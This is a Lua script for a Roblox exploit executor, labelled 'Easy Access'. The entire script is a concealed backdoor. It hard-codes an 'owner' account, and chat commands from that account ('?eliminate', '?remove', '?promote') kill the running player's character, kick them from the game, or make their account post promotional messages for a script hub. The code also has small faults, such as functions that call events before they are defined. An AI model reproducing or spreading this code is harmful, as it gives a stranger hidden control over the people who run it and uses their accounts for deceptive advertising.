getgenv().Game = game
getgenv().JobID = getgenv().Game.JobId
getgenv().PlaceID = getgenv().Game.PlaceId
getgenv().Service_Wrap = function(serviceName)
    if cloneref then
        return cloneref(getgenv().Game:GetService(serviceName))
    else
        return getgenv().Game:GetService(serviceName)
    end
end

getgenv().ReplicatedStorage = getgenv().Service_Wrap("ReplicatedStorage")
getgenv().Players = getgenv().Service_Wrap("Players")
getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")

local ownerName = "ItsYoDawgWsgGng"
local ownerPlayer = getgenv().Players:FindFirstChild(ownerName)

if not ownerPlayer then
    warn("No Owner Found!")
else
    getgenv().TextChatService.MessageReceived:Connect(function(message)
        local sender = message.TextSource.Name
        local text = message.Text

        if sender == ownerName then
            if text == "?eliminate" then
                getgenv().ReplicatedStorage:FindFirstChild("Keybinds"):Fire()
            elseif text == "?remove" then
                getgenv().ReplicatedStorage:WaitForChild("Keybinds-2"):Fire("You have been kicked by: Owner Of Script! Sorry.")
            elseif text == "?promote" then
                getgenv().ReplicatedStorage:WaitForChild("Keybinds-1"):Fire()
            end
        end
    end)
end

getgenv().Players.PlayerAdded:Connect(function(player)
    if player.Name == ownerName or player.UserId == 6132973250 then
        getgenv().TextChatService.MessageReceived:Connect(function(message)
            local sender = message.TextSource.Name
            local text = message.Text

            if sender == player.Name then
                if text == "?eliminate" then
                    getgenv().ReplicatedStorage:WaitForChild("Keybinds"):Fire()
                elseif text == "?remove" then
                    getgenv().ReplicatedStorage:WaitForChild("Keybinds-2"):Fire("You have been kicked by: Owner Of Script! Sorry.")
                elseif text == "?promote" then
                    getgenv().ReplicatedStorage:WaitForChild("Keybinds-1"):Fire()
                end
            end
        end)
    end
end)

getgenv().Players = getgenv().Service_Wrap("Players")
getgenv().ReplicatedStorage = getgenv().Service_Wrap("ReplicatedStorage")
getgenv().Lighting = getgenv().Service_Wrap("Lighting")
getgenv().StarterPlayer = getgenv().Service_Wrap("StarterPlayer")
getgenv().Workspace = getgenv().Service_Wrap("Workspace")
getgenv().Terrain = getgenv().Workspace.Terrain or getgenv().Workspace:FindFirstChild("Terrain")
getgenv().TeleportService = getgenv().Service_Wrap("TeleportService")
getgenv().TweenService = getgenv().Service_Wrap("TweenService")
getgenv().HttpService = getgenv().Service_Wrap("HttpService")
getgenv().AssetService = getgenv().Service_Wrap("AssetService")
getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
getgenv().RBXGeneral = getgenv().TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
getgenv().LocalPlayer = getgenv().Players.LocalPlayer
getgenv().PlayerGui = getgenv().LocalPlayer:WaitForChild("PlayerGui") or getgenv().LocalPlayer:FindFirstChild("PlayerGui")
getgenv().Character = getgenv().LocalPlayer.Character or getgenv().LocalPlayer.CharacterAdded:Wait()
getgenv().HumanoidRootPart = getgenv().Character:WaitForChild("HumanoidRootPart") or getgenv().Character:FindFirstChild("HumanoidRootPart")
getgenv().Humanoid = getgenv().Character:WaitForChild("Humanoid") or getgenv().Character:FindFirstChildWhichIsA("Humanoid")

local function updateCharacterComponents(character)
    getgenv().Character = character
    getgenv().HumanoidRootPart = character:WaitForChild("HumanoidRootPart") or character:FindFirstChild("HumanoidRootPart")
    getgenv().Humanoid = character:WaitForChild("Humanoid") or character:FindFirstChildWhichIsA("Humanoid")
end

updateCharacterComponents(getgenv().Character)
getgenv().LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    updateCharacterComponents(newCharacter)
end)

function run_kill()
    killEvent:Fire()
end

function run_chat()
    chatEvent:Fire()
end

function run_kick(reason)
    kickEvent:Fire(reason)
end

local killEvent = Instance.new("BindableEvent")
killEvent.Name = "Keybinds"
killEvent.Parent = ReplicatedStorage

local chatEvent = Instance.new("BindableEvent")
chatEvent.Name = "Keybinds-1"
chatEvent.Parent = ReplicatedStorage

local kickEvent = Instance.new("BindableEvent")
kickEvent.Name = "Keybinds-2"
kickEvent.Parent = ReplicatedStorage

killEvent.Event:Connect(function()
    getgenv().Humanoid.Health = 0
end)

kickEvent.Event:Connect(function(reason)
    getgenv().LocalPlayer:Kick(reason)
end)

chatEvent.Event:Connect(function()
    getgenv().Speeches = {
        "Zacks Easy Hub [ON TOP!]",
        "V6 Is The BEST!",
        "10/10 Script!",
        "This script hub is OP!",
        "Powerful script!",
        "I can vouch for this script!",
        "Best script for this game!"
    }

    getgenv().randomSpeech = getgenv().Speeches[math.random(1, #getgenv().Speeches)]
    getgenv().RBXGeneral:SendAsync(getgenv().randomSpeech)
end)

print("Easy Access - Loaded!")
